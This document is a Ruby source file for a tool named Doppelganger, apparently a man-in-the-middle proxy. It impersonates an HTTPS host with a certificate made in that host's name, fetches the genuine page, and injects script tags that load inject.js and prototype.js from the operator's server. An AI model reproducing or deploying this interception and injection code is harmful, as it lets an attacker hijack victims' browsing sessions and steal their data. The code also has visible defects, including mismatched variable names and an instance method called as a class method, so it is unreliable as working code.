#!/usr/bin/ruby

require "net/http"
require "net/https"
require "webrick"
require "webrick/https"
require "pp"
require "openssl"

class Doppelganger
	@server = nil
	@host = nil
	@port = nil
	@pid = nil

	@server_config = nil
	@config = nil

	@doppelganger_httpd_addr = nil
	@doppelganger_httpd_port = nil
	@doppelganger_proxy_addr = nil
	@doppelganger_proxy_port = nil
	

	def create port
		@server = WEBrick::HTTPServer.new(
			:ServerName => @host,
			:Port => port,
			:SSLEnable => true,
			:SSLVerifyClient => ::OpenSSL::SSL::VERIFY_NONE,
			:SSLCertName => [['C', 'US'], ['O', @host], ['CN', @host], ['OU', rand(65535).to_s]],
			:DocumentRoot => "/tmp")
		
		#@server.mount_proc("/") { |req, res|
		#	pp req
		#	pp res
		#}
		@server.mount("/", DoppelgangerCGI)
	end
	
	def initialize(config)
		@config = config
		@host = config[:Server]
		@doppelganger_http_addr = config[:HttpdAddr]
		@doppelganger_httpd_port = config[:HttpdPort]
		@doppelganger_proxy_addr = config[:ProxyAddr]
		@doppelganger_proxy_port = config[:ProxyPort]
		@port = 0
	end

	def config
		@config
	end
	def server_config
		@server_config
	end
	
	def start
			create @port
		['INT', 'TERM', 'KILL'].each { |signal|
        trap(signal) { @server.shutdown }
    }
		


		@pid = fork do
			begin
		 		@server.start 					
			end
		end
		@port = @server.config[:Port]

		@server_config = {
			:ServerName => @host,
			:Port => @port }

		return @server_config
	end

	def ModifyBody (body)
		server_url = "http://" + @doppelganger_httpd_addr + ":" + @@doppelganger_httpd_port.to_s
		prototype_file =  server_url + "/prototype.js"
      js_file = server_url + "/inject.js"

      search_string = '<head>'

	#prototype_data_file = File.open(@http_root + "/prototype.js", "r");
	#prototype_data = prototype_data_file.read

      #js_data_file = File.open(@http_root + "/inject.js", "r")
      #js_data = js_data_file.read
      
      replace_string = "<head><script language='javascript' src='" + prototype_file + "'></script><script language='javascript' src='" + js_file + "'></script>"
      #replace_string = "<script language='javascript'>" + prototype_data + "</script>"
#      puts replace_string
      gsub_string = "/" + search_string + "/"
#puts gsub_string
     
      modified_body = body.gsub(search_string, replace_string)
      if modified_body != body
        #puts "Successfully modified body!"
        return modified_body
      else
        #puts "Body modification failed."
        return body
      end
    end
end


class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
	@doppelganger = nil
	def initialize(config)
		
	end

	def do_GET(request, response)
		
	uri = URI.parse(request.request_uri.to_s)

	http = Net::HTTP.new(uri.host, uri.port)
   	http.use_ssl = true if uri.scheme == "https"  # enable SSL/TLS
    	http.start {
      		http.request_get(uri.path) {|res|
			$content_type = "Content-type: " + res['content-type'] + "\r\n\r\n"
		
			$body = Doppelganger::ModifyBody(res.body)
     	 }
    	}

	#pp $body
	    
	#response.status = "200"
	#response['Content-Type'] = $content_type
	response.body = $body
		

  	end

	def do_POST(request, response)
		pp request
		do_GET(request, response)
	end 
end
